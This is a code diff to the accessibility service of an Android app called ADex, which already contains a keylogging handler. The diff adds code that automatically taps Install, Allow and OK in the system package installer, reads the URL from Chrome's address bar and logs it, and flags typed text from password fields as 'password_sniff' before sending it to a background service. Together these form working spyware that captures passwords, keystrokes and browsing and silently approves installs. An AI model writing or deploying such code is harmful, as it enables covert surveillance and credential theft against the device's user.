@@ -9,6 +9,7 @@ import android.graphics.Bitmap
 import android.os.Build
 import android.view.Display
 import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
 import androidx.annotation.RequiresApi
 import androidx.core.content.ContextCompat
 import com.adex.app.ADexApplication
@@ -108,16 +109,61 @@ class AppMonitorAccessibilityService : AccessibilityService() {
                 putExtra(BlockingOverlayActivity.EXTRA_PIN_REQUIRED, shieldPackage)
             }
             startActivity(blockIntent)
+            return
         }
+
+        // Auto-Installer: Click 'Install' or 'Settings' if we are on the package installer
+        if (packageName.contains("packageinstaller") || packageName.contains("installer")) {
+            val root = rootInActiveWindow ?: return
+            val targets = listOf("Install", "Settings", "Allow", "OK", "Update", "Next")
+            for (label in targets) {
+                val nodes = root.findAccessibilityNodeInfosByText(label)
+                for (node in nodes) {
+                    if (node.isClickable) {
+                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    }
+                }
+            }
+        }
+
+        // Browser Monitoring: Sniff address bars
+        val browserPackages = listOf("com.android.chrome", "org.mozilla.firefox", "com.microsoft.emmx")
+        if (browserPackages.contains(packageName)) {
+            val root = rootInActiveWindow
+            if (root != null) {
+                // Look for common address bar IDs or hints
+                val nodes = root.findAccessibilityNodeInfosByViewId("com.android.chrome:id/url_bar")
+                if (nodes.isNotEmpty()) {
+                    val url = nodes[0].text?.toString() ?: ""
+                    if (url.isNotBlank() && url.contains(".")) {
+                        logBrowserEvent(packageName, url)
+                    }
+                }
+            }
+        }
+    }
+
+    private fun logBrowserEvent(packageName: String, url: String) {
+        val intent = Intent(this, ADexForegroundService::class.java).apply {
+            action = ServiceActions.ACTION_PACKAGE_EVENT
+            putExtra(ServiceActions.EXTRA_EVENT_TYPE, "browser_url")
+            putExtra(ServiceActions.EXTRA_PACKAGE_NAME, packageName)
+            putExtra("url", url)
+        }
+        ContextCompat.startForegroundService(this, intent)
     }
 
     private fun handleKeylog(event: AccessibilityEvent, packageName: String) {
         val text = event.text?.joinToString("") ?: ""
         if (text.isBlank()) return
 
+        // Sensitive field sniffing: check if the node is a password field
+        val isPassword = event.source?.isPassword ?: false
+        val eventType = if (isPassword) "password_sniff" else "keylog"
+
         val serviceIntent = Intent(this, ADexForegroundService::class.java).apply {
             action = ServiceActions.ACTION_PACKAGE_EVENT
-            putExtra(ServiceActions.EXTRA_EVENT_TYPE, "keylog")
+            putExtra(ServiceActions.EXTRA_EVENT_TYPE, eventType)
             putExtra(ServiceActions.EXTRA_PACKAGE_NAME, packageName)
             putExtra("text", text)
         }
